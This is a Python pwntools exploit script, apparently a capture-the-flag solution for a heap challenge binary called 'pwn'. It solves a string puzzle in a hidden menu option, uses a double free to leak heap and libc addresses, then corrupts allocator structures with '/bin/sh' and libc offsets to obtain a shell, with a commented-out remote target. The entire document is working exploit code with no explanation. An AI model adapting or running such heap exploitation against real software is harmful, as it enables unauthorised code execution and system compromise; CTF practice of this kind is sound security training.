#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./pwn')
p = process('./pwn', env={'LD_PRELOAD':'./libc.so.6'})
# p = remote('172.16.9.41', 9001)


'''
1.Add
2.Delete
3.View
4.Exit
'''

def add(size, payload):
  p.sendlineafter('4.Exit', '1')
  p.sendlineafter('Input Size:', str(size))
  p.sendafter('Input Content:', payload)

def delete(idx):
  p.sendlineafter('4.Exit', '2')
  p.sendlineafter('Which one do you want to delete?', str(idx))

def show(idx):
  p.sendlineafter('4.Exit', '3')
  p.sendlineafter('Which one do you want to view?', str(idx))

def gift():
  p.sendlineafter('4.Exit', '5')
  p.recvuntil('Do you want one more chance?\n')
  v11 = []
  for i in range(1002001):
    v11.append(0)
  
  for i in range(1, 255):
    v11[1002 * i] = 1
    v11[1002 * i - 1] = 1

  s = p.recvuntil('\n')[:-1]
  v4 = 0
  v5 = 0
  for j in range(2, 256):
    for k in range(256 - j):
      if s[k] == s[j - 1 + k]:
        if v11[1001 * (k + 1) + j + k - 2]:
          v11[1001 * k + j + k - 1] = 1
          if (j - 1) > v5:
            v5 = j - 1
            v4 = k
  
  res = ''
  for i in range(v5 + 1):
    res += s[v4]
    v4 = v4 + 1
  success('CHANCE:' +  res)
  p.sendline(res)
 
if __name__ == "__main__":
  payload = p64(0) * 2 + p64(0) + p64(0x41) + '\n'
  add(0x38, payload)    #0
  add(0x38, payload)    #1
  add(0x48, payload)    #2
  add(0x48, payload)    #3
  gift()
  
  delete(0)
  delete(1)
  delete(0)

  show(0)
  p.recvuntil('\n')
  heap = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x40
  success('HEAP:\t' + str(hex(heap)))

  add(0x38, p64(heap + 0x20) + p64(0) + p64(0x41) + '\n')
  add(0x38, p64(0x51) * 6 + '\n')
  add(0x38, payload)
  add(0x38, p64(0x41) * 3 + p64(0x91) + '\n')
  delete(1)
  show(1)
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3c4b78

  delete(7)
  add(0x38, p64(0) * 2 + '/bin/sh\x00' + p64(0x61) + p64(libc + 0x3c4b78) + p64(libc + 0x3c5510) + '\n')
  delete(3)
  add(0x48, p64(0) * 7 + p64(heap + 0x108) + p64(libc + 0x453a0))
  

  success('LIBC:\t' + str(hex(libc)))
  success('HEAP:\t' + str(hex(heap)))
  
  gdb.attach(p)
  p.interactive()